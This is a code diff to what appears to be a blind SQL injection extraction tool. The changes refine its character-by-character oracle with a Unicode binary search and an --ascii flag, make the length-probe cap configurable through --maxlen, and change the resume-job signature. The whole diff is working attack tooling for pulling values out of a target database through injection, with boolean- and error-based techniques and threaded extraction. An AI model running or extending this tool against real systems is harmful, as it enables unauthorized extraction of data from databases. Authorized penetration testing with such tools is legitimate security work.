@@ -315,15 +315,14 @@ class Oracle_:
 
     def char(self, query, pos):
         # binary-search the Unicode code point; ASCII stays in the fast 0-127 band,
-        # non-ASCII auto-extends so UTF-8 data isn't silently corrupted.
+        # non-ASCII auto-extends (unless --ascii) so UTF-8 data isn't silently corrupted.
         code = self.dbms.code_expr(self.dbms.substr(query, pos))
-        hi = 127
-        if self.fires(f"{code}>{hi}"):
-            hi = 255
+        lo, hi = 0, 127
+        if not getattr(self.a, "ascii_only", False) and self.fires(f"{code}>127"):
+            lo, hi = 128, 255                         # we know it's non-ASCII; raise the floor
             cap = self.a.max_codepoint
             while hi < cap and self.fires(f"{code}>{hi}"):
                 hi = min(hi * 8, cap)
-        lo = 0
         while lo < hi:
             mid = (lo + hi) // 2
             if self.fires(f"{code}>{mid}"):
@@ -559,7 +558,7 @@ def extract_error(target, dbms, ctx, a, query=None):
 def extract_search(oracle, a, state_path, sig, value="", length=None):
     q = a.query
     if length is None:
-        length = _bin_length(oracle, q, cap=4096)
+        length = _bin_length(oracle, q, cap=a.maxlen)
         save_state(state_path, sig, length, value, oracle.t.count)
     print(f"[+] length = {length}")
 
@@ -626,12 +625,12 @@ def _bin_length(oracle, query, cap):
     return lo
 
 
-def read_scalar(target, det, a, query, cap=4096):
+def read_scalar(target, det, a, query, cap=None):
     """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
     if det.technique == "error-based":
         return extract_error(target, det.dbms, det.ctx, a, query)
     o = det.oracle
-    n = _bin_length(o, query, cap)
+    n = _bin_length(o, query, cap if cap is not None else a.maxlen)
     if n == 0:
         return ""
     if a.threads > 1 and o.kind == "boolean-based":
@@ -688,7 +687,7 @@ def dump_mode(target, det, a):
 def job_signature(a, det, target):
     raw = "|".join([target.method, target.url or "", target.data or "",
                     det.technique, det.dbms.name, det.ctx.name, a.query or "",
-                    str(a.sleep), str(a.cmin), str(a.cmax)])
+                    str(a.sleep)])
     return hashlib.sha1(raw.encode()).hexdigest()[:10]
 
 def load_state(path, sig):
@@ -743,9 +742,9 @@ def main():
     tun.add_argument("--max-codepoint", type=int, default=0x10FFFF, dest="max_codepoint", help="upper bound for Unicode extraction")
     tun.add_argument("--retries", type=int, default=1)
     tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
-    tun.add_argument("--maxlen", type=int, default=64)
-    tun.add_argument("--cmin", type=int, default=32)
-    tun.add_argument("--cmax", type=int, default=126)
+    tun.add_argument("--maxlen", type=int, default=4096, help="max value length / length-probe cap")
+    tun.add_argument("--ascii", dest="ascii_only", action="store_true",
+                     help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
     tun.add_argument("--proxy")
 
     res = ap.add_argument_group("resume")
@@ -806,7 +805,7 @@ def main():
             print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
     val = extract_search(det.oracle, a, state_path, sig, value, length)
     if val is None:
-        print("[!] length not found (empty result, bad query, or maxlen too low)")
+        print("[!] length not found (empty result or bad query)")
         sys.exit(1)
     print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
     try:
